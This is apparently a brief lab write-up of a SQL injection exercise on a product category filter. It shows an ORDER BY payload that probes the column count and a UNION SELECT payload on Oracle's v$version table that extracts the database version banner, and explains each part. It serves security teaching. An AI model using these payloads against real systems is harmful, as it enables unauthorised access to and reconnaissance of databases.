# SQL Injection — Database Version Extraction


Original Query:

SELECT * FROM products
WHERE category='CATEGORY'

Payload:

Accessories' ORDER BY 2--

The query becomes:

SELECT * FROM products
WHERE category='Accessories' ORDER BY 2--'

Why does it work?

1. ORDER BY 2 → Checks if the query returns at least two columns.
2. -- → Comments out the rest of the SQL query.

Result:

ORDER BY 2 = works
The query returns at least 2 columns

Payload:

Accessories' UNION SELECT banner, NULL FROM v$version--

Why does it work?

1. UNION SELECT → Combines the original query with another SELECT query.
2. banner → Contains Oracle version information.
3. NULL → Used for the second column.
4. v$version → Oracle table containing version information.
5. -- → Comments out the rest of the SQL query.

Result:

Oracle Database 11g Express Edition Release 11.2.0.2.0

# Database Version Extracted
